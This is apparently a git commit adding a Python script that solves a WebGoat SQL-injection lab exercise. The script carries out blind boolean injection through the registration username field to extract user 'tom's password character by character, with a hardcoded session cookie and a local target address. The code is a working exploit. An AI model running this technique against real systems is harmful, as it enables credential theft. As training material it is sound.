aaafa68bb5030da276582431a50c653faec9b700
the25yahya <114318659+the25yahya@users.noreply.github.com>
2024-05-25 04:36:32 +0200

    added backup

--- sqlFuzz.py
+++ sqlFuzz.py
@@ -1,25 +1,42 @@
-import json
-import requests
-
-def sql_injection_advance_5():
-    alphabet = 'qwertyuioplkjhgfdsamnbvcxz'
-    alphabet_index = 0
-    password_index = 0
-    password = ''
-    
-    headers = {
-        'Cookie' : "JSESSIONID=RHYM4569z5nWmVPpa2y2tdhgjmsw-P3-4gIvdweS",
-    }
-    
-    while True:
-        payload = 'tom\' AND substring(password, {}, 1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])
-        
-        data = {
-            'username_reg' : payload,
-            'email_reg': 'a@a',
-            'password_reg':'a',
-            'confirm_password_reg': 'a'
-        }
-        
-        r = requests .put('http://192.168.8.124:8080/WebGoat/')
-    
+import json  
+import requests  
+  
+def sql_injection_advance_5():  
+     alphabet_index = 0  
+     alphabet = 'abcdefghijklmnopqrstuvwxyz'  
+     password_index = 0  
+     password = ''  
+  
+     headers = {  
+        'Cookie': "JSESSIONID=gGCbvLZqvptCkqsmF7Ky2yONVOiVGTL8720tpyhe",  
+     }  
+  
+     while True:  
+         payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, alphabet[alphabet_index])  
+  
+         data = {  
+             'username_reg': payload,  
+             'email_reg': 'a@a',  
+             'password_reg': 'a',  
+             'confirm_password_reg': 'a'  
+         }  
+  
+         r = requests.put('http://192.168.8.124:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data)  
+  
+         try:  
+             response = json.loads(r.text)  
+         except:  
+             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")  
+             return  
+  
+         if "already exists please try to register with a different username" not in response['feedback']:  
+             alphabet_index += 1  
+             if alphabet_index > len(alphabet) - 1:  
+                 return  
+         else:  
+             password += alphabet[alphabet_index]  
+             print(password)  
+             alphabet_index = 0  
+             password_index += 1  
+  
+sql_injection_advance_5()
